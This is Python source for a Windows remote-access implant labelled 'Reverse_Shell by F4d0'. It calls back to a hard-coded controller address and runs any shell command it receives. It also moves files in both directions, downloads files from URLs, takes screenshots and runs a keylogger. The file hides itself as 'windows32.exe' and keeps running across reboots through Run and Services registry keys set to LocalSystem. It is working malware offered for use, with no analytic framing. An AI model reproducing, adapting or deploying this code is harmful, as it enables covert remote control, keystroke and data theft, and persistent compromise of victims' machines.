#!/usr/bin/python3
import socket
# from termcolor import colored
import subprocess
import json
import sys
import os
import base64
import shutil
import time
import requests
from mss import mss
import threading
import keylogger


HOST = '192.168.0.94'
PORT = 54321
pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
keylogger_path = os.environ['appdata'] + '\\processmanager.bin'
persist_run = True     # Implements persistence through RUN registry key - User Permissions
persist_srv = True      # Implements persistence through Services registry key - NT Authority/System permissions
persist_stu = False      # Implements persistence through Start Up user folder - User permissions
isimage = False         # Will open an image the first time it executes itself


def get_help():
    return '''
#########################################################################################
@ Reverse_Shell by F4d0

OPTIONS:
    
    send <path>     --> send file to the remote host
    get <path>      --> get file from the remote host
    download <URL>  --> downloads a file to the remote host
    screenshot      --> takes a screenshot from the host and sends to the bot controller
    isadmin         --> check for administrator rights on the bot host
    start <path>    --> starts the app in the remote host
    keylog_start    --> starts the keylogger
    keylog_dump     --> dumps the content collected by the keylogger
    q               --> quit
    
#########################################################################################
'''


def reliable_send(_s, _data):
    if type(_data) is bytes:
        _data = _data.decode('UTF-8')
    json_data = json.dumps(_data)
    _s.sendall(json_data.encode('UTF-8'))


def reliable_recv(_s):
    data = ""
    while True:
        try:
            data = data + (_s.recv(1024)).decode('UTF-8')
            print(data)
            return json.loads(data)
        except ValueError:
            continue


def is_admin():
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
    except:
        return False
    else:
        return True


def screenshot():
    with mss() as ss:
        ss.shot()


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as f:
        f.write(get_response.content)


def connection(_s):
    while True:
        time.sleep(20)
        try:
            _s.connect((HOST, PORT))
            break
        except:
            continue


def shell(_s):
    global keylogger_path
    while True:
        cmd = reliable_recv(_s)
        if cmd == 'q':
            # print('[-] Instruction to close sent from the server')
            # print(colored('[-] Instruction to close sent from the server', 'red'))
            _s.close()
            sys.exit(0)
        elif cmd[:5] == 'help':
            reliable_send(_s, get_help())
        elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
            try:
                os.chdir(cmd[3:])
            except:
                continue
        elif cmd[:4] == 'send' and len(cmd[5:]) > 1:
            with open(cmd[5:], 'wb') as f:
                file_data = reliable_recv(_s)
                f.write(base64.b64decode(file_data))
                f.close()
        elif cmd[:3] == 'get' and len(cmd[4:]) > 1 and cmd[3:4] == ' ':
            try:
                with open(cmd[4:], 'rb') as f:
                    file_data = f.read()
                    reliable_send(_s, base64.b64encode(file_data))
            except:
                failed = 'Failed to Upload'
                reliable_send(_s, base64.b64encode(failed))
        elif cmd[:8] == 'download' and len(cmd[9:]) > 1:
            try:
                download(cmd[9:])
                reliable_send(_s, '[+] Downloaded File from the specified URL!')
            except:
                reliable_send(_s, '[!] Failed to Download the File from the specified URL!')
        elif cmd[:10] == 'screenshot':
            try:
                screenshot()
                with open('monitor-1.png', 'rb') as sc:
                    reliable_send(_s, base64.b64encode(sc.read()))
                os.remove('monitor-1.png')
            except:
                reliable_send(_s, '[!] Failed to take the screenshot!!')
        elif cmd[:5] == "start":
            try:
                if len(cmd[6:]) < 1:
                    reliable_send(_s, '[!] Please specify an app to start!')
                    continue
                subprocess.Popen(cmd[6:], shell=True)
                reliable_send(_s, '[+] Started!!')
            except:
                reliable_send(_s, '[!] Fail to start!')
        elif cmd[:7] == 'isadmin':
            try:
                if is_admin():
                    reliable_send(_s, '[+] The user HAS Admin priviledges!')
                else:
                    reliable_send(_s, '[!] The user does NOT has Admin priviledges!')
            except:
                reliable_send(_s, 'Can`t perform the check')
        elif cmd[:12] == 'keylog_start':
            tl = threading.Thread(target=keylogger.start)
            tl.start()
        elif cmd[:11] == 'keylog_dump':
            fn = open(keylogger_path, "r")
            reliable_send(_s, fn.read())
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(_s, result)


def create_dir(_dir):
    if not os.path.exists('\\'.join(_dir.split('\\')[:-1])):
        print("Directory to create: ", '\\'.join(_dir.split('\\')[:-1]))
        os.makedirs('\\'.join(_dir.split('\\')[:-1]))


def persistence_stu(_pers_loc):
    if not os.path.exists(_pers_loc):
        create_dir(_pers_loc)
        shutil.copyfile(sys.executable, _pers_loc)
        startup = os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\W32Service.bat'
        print("Create BAT file: ", startup)
        if not os.path.exists(startup):
            with open(startup, 'wb') as f:
                f.write(_pers_loc)
                f.close()


def persistence_run(_pers_loc):
    if not os.path.exists(_pers_loc):
        create_dir(_pers_loc)
        shutil.copyfile(sys.executable, _pers_loc)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        '/v IT_Win_Service32 /t REG_SZ /d "' + _pers_loc + '"', shell=True)


def persistence_service(_pers_loc):
    if not os.path.exists(_pers_loc):
        create_dir(_pers_loc)
        shutil.copyfile(sys.executable, _pers_loc)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v ImagePath /t REG_EXPAND_SZ /d "' + _pers_loc + '"', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v Type /t REG_DWORD /d 16', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v Start /t REG_DWORD /d 2', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v ErrorControl /t REG_DWORD /d 0', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v DisplayName /t REG_SZ /d "' + _pers_loc.split('\\')[-1] + '"', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v DependOnService /t REG_MULTI_SZ /d Tcpip', shell=True)
        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                        '/v ObjectName /t REG_SZ /d LocalSystem', shell=True)


def client():
    if persist_run:
        persistence_run(pers_loc)
    if persist_srv:
        persistence_service(pers_loc)
    if persist_stu:
        persistence_stu(pers_loc)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        connection(s)
        with s:
            shell(s)


if __name__ == '__main__':
    client()

